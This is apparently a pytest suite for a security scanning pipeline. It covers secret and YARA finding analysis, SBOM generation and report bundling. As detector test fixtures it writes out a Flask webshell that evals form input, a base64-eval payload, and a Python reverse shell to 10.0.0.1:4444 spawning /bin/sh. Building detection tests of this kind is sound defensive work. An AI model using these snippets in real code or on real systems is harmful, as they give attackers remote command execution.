import io
import json
import zipfile
from policy_engine import (
    analyze_secrets,
    analyze_yara,
    generate_cyclonedx_sbom,
)
from app.worker import run_yara_scan
from app.reporting import build_report_bundle

def test_analyze_secrets_pass():
    report = {"results": {}}
    result = analyze_secrets(report)
    assert result["status"] == "PASS"
    assert result["total_issues"] == 0
    assert result["blocking_issues"] == 0


def test_analyze_secrets_fail():
    report = {
        "results": {
            "app/main.py": [
                {
                    "type": "AWS Key",
                    "filename": "app/main.py",
                    "hashed_secret": "abc123xyz",
                    "line_number": 45
                }
            ]
        }
    }
    result = analyze_secrets(report)
    assert result["status"] == "FAIL"
    assert result["total_issues"] == 1
    assert result["blocking_issues"] == 1
    assert result["examples"][0]["type"] == "AWS Key"


def test_analyze_secrets_missing():
    result = analyze_secrets(None)
    assert result["status"] == "MISSING"


def test_analyze_yara_pass():
    report = []
    result = analyze_yara(report)
    assert result["status"] == "PASS"
    assert result["total_issues"] == 0


def test_analyze_yara_fail():
    report = [
        {
            "rule": "Backdoor_Webshell",
            "filename": "vuln.py",
            "description": "Detects Python webshell",
            "author": "Aegis"
        }
    ]
    result = analyze_yara(report)
    assert result["status"] == "FAIL"
    assert result["total_issues"] == 1
    assert result["blocking_issues"] == 1
    assert result["examples"][0]["rule"] == "Backdoor_Webshell"


def test_analyze_yara_missing():
    result = analyze_yara(None)
    assert result["status"] == "MISSING"


def test_generate_sbom(tmp_path):
    req_file = tmp_path / "requirements.txt"
    req_file.write_text("Flask==3.1.3\nrequests>=2.34.2\n# Comment line\n\nunpinned_package\n")
    
    sbom_file = tmp_path / "sbom.json"
    generate_cyclonedx_sbom(req_file, sbom_file)
    
    assert sbom_file.exists()
    sbom_data = json.loads(sbom_file.read_text())
    assert sbom_data["bomFormat"] == "CycloneDX"
    assert sbom_data["specVersion"] == "1.5"
    assert len(sbom_data["components"]) == 3
    
    packages = {c["name"]: c.get("version") for c in sbom_data["components"]}
    assert "Flask" in packages
    assert packages["Flask"] == "3.1.3"
    assert "requests" in packages
    assert packages["requests"] is None
    # A bare requirement is still a dependency, listed without a version.
    assert packages["unpinned_package"] is None


def test_run_yara_scan_webshell(tmp_path):
    # Test script containing webshell signature
    test_file = tmp_path / "webshell.py"
    test_file.write_text("import flask\napp = flask.Flask(__name__)\n@app.route('/')\ndef shell():\n    eval(request.form['cmd'])\n")
    
    findings = run_yara_scan(str(test_file), job_id="test_job")
    assert len(findings) > 0
    assert any(f["rule"] == "Backdoor_Webshell" for f in findings)


def test_run_yara_scan_obfuscated(tmp_path):
    # Test script containing base64 eval signature
    test_file = tmp_path / "obfuscated.py"
    test_file.write_text("import base64\npayload = 'print(1)'\neval(base64.b64decode(payload))\n")
    
    findings = run_yara_scan(str(test_file), job_id="test_job")
    assert len(findings) > 0
    assert any(f["rule"] == "Obfuscated_Payload" for f in findings)


def test_run_yara_scan_reverse_shell(tmp_path):
    # Test script containing reverse shell signature
    test_file = tmp_path / "rev.py"
    test_file.write_text("import socket, subprocess, pty\ns = socket.socket()\ns.connect(('10.0.0.1', 4444))\npty.spawn('/bin/sh')\n")
    
    findings = run_yara_scan(str(test_file), job_id="test_job")
    assert len(findings) > 0
    assert any(f["rule"] == "Suspicious_Shell_Spawn" for f in findings)


def test_local_bundle_preserves_raw_and_normalized_codeql_evidence(tmp_path):
    raw = b'{"version":"2.1.0","runs":[]}'
    normalized = b'{"status":"completed","findings":[]}'
    (tmp_path / "codeql.sarif").write_bytes(raw)
    (tmp_path / "codeql-report.json").write_bytes(normalized)

    with zipfile.ZipFile(io.BytesIO(build_report_bundle(tmp_path))) as bundle:
        assert bundle.read("raw/codeql.sarif") == raw
        assert bundle.read("raw/codeql-report.json") == normalized
